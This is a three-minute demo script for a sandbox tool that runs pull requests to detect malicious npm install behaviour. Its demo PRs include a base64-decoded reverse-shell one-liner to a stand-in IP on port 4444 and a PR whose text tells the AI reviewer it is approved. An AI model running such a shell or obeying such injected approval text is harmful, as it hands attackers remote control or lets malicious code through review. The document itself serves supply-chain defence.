# PR Detonator: 3-minute demo script

Everything shown is real: real GitHub PRs on
[pr-detonator-demo/demo-target](https://github.com/pr-detonator-demo/demo-target/pulls), a
real Chamber VM with eBPF tracing, and real Meta models. Record with the PR tabs pre-opened;
each check takes 30–60 s, so trigger fresh runs before recording (push an empty commit to each
branch) and show the finished results. Have `eval/SWEEP.md`, `eval/DWELL_TIME.md`,
`eval/BASELINE.md` and the dashboard open in tabs.

## 0:00 – 0:25 · Cold open: a real finding

> "This is a tool that reviews pull requests by *running* them. To test it, I pointed it at
> a hundred npm packages published in the last few minutes — packages nobody had vetted. It
> cleared the ones that installed, and flagged one. That one, during install, connected to a
> hardcoded IP address with TLS verification turned off and ran whatever came back. It isn't
> malware — it's a real package with an unsafe fallback — but no advisory existed, nobody
> told us to look, and the behavior alone gave it away. That's the whole idea."

Show `eval/SWEEP.md` (the finding row) briefly. Don't name the package on camera (reported
privately, not fixed yet).

## 0:25 – 0:45 · Why this, why now

> "Supply-chain attacks run at `npm install`, before anyone imports a line of code — and they
> arrive as one-line version bumps, so there's nothing in the diff to review. And now AI
> agents are opening those PRs and picking the dependencies. Something has to check what the
> agent just installed. We do it by running it in a sandbox and watching the kernel."

One line on the architecture: **the model predicts, the kernel verifies, rules set the floor.**

## 0:45 – 1:25 · The dependency did it (E8)

[PR #12](https://github.com/pr-detonator-demo/demo-target/pull/12), "Bump color-helper from
1.0.0 to 1.0.1" — a Dependabot-style one-line diff.
1. The check is **🛑 Blocked**; merge disabled by branch protection.
2. **Files changed**: inline comment on the bumped line, naming **color-helper**.
3. The report's *Where it came from* points **inside the dependency** —
   `node_modules/color-helper/install.js`, with the line decoded by Muse and a sha256.
4. *Compared to the base branch* → **New at install: `tcp:203.0.113.10:4444`** (differential).

> "The author is innocent — it's a version bump. The kernel recorded that the dependency's
> install script opened a socket, we captured the file out of the sandbox, and the model
> decoded the exact line. Differential detonation shows this is new versus the old version."

## 1:25 – 1:50 · Obfuscation decoded, and it can't be fooled (E5 + E6)

- [PR #8](https://github.com/pr-detonator-demo/demo-target/pull/8): inline comment on the
  `cp.spawn` line; Muse decoded the base64 to `bash -i >& /dev/tcp/203.0.113.10/4444 0>&1`.
- [PR #9](https://github.com/pr-detonator-demo/demo-target/pull/9): the PR text tells the AI
  reviewer it's approved.

> "Muse flags the injection itself — but even if it were fooled, model output can only raise
> severity, never clear a kernel fact. Prompt Guard 2 runs too; we measured it, it catches
> blunt jailbreaks but not this kind, which is exactly why the floor isn't a model."

## 1:50 – 2:15 · It triages instead of crying wolf (E9)

[PR #13](https://github.com/pr-detonator-demo/demo-target/pull/13), "Add PDF export with
puppeteer" → **⚠️ Needs review**. Show the **Triage** section: the investigator agent made 4
tool calls and wrote *"puppeteer, published 2013, maintainers unchanged, install.mjs only
calls downloadBrowsers(); storage.googleapis.com is a known package CDN."*

> "A real package that downloads a browser lands on 'needs review', not blocked. The agent
> does the first pass of the human's homework — registry age, maintainer changes, the actual
> script — and can escalate but never clear."

## 2:15 – 2:40 · The evidence

Flash three things:
- **0 false blocks** across 100 uncurated live packages (`eval/SWEEP.md`) and 104 popular ones
  — and the same bar held at **500** (`eval/SWEEP500.md`): 413/421 cleared, nothing benign
  hard-blocked.
- **`npm audit` says "0 vulnerabilities"** on the same attacks it hasn't seen yet
  (`eval/BASELINE.md`); dwell time of real incidents was hours to months (`eval/DWELL_TIME.md`).
- The **dashboard** and its **behavior atlas** — what each package did at install.

> "Advisory tools are retrospective — they protect you from last year's attack. This catches
> behavior the first time it runs, in seconds, at about a cent and a half per PR."

## 2:40 – 3:00 · Where this goes — and show it working

Run this live; it takes a second and needs no network:

```
python -m brain.sbom diff eval/sbom/color-helper_at_1.0.0.json \
                          eval/sbom/color-helper_at_1.0.1.json eval/sbom/public_key.pem
```

Same package, two versions, detonated under identical conditions. The output says
**old verified, new verified**, then *"new raw IP contacted at install: 203.0.113.10"* and
*"new install script: node_modules/color-helper/install.js — none → 967cb59a"*.

> "Detonate every new npm release minutes after publish and diff its behavior against the last
> version — 'this release started talking to a new address' as an alert, not a GHSA days later.
> That's the same signed record you just watched verify. Lockfiles pin bytes; this pins
> behavior."

Two things to say out loud, because they're the honest part: the signature proves the **record**
wasn't edited, not that the package is safe — and the tool reports this pair as only
*partially comparable*, because these two records don't pin the image and Node versions. It
tells you what it couldn't compare instead of quietly comparing anyway.

## Fallbacks

- If a live check is slow, show the already-completed run on the same PR.
- If the Chamber is down, the PR comments and inline reviews stay on GitHub as evidence.
- Keep the package name in the cold open **unspoken** until the maintainer has shipped a fix.
  Say "we reported it privately to the maintainer"; never "fixed" or "acknowledged" unless they
  reply (report sent Nov 2, 2026, no response yet). Also avoid
  claiming the name is withheld: it is recoverable from this repo's git history, so the right
  phrasing is that we are not naming it here, not that it is concealed. Check no terminal tab,
  JSON file or `git log` on screen shows the identifier.
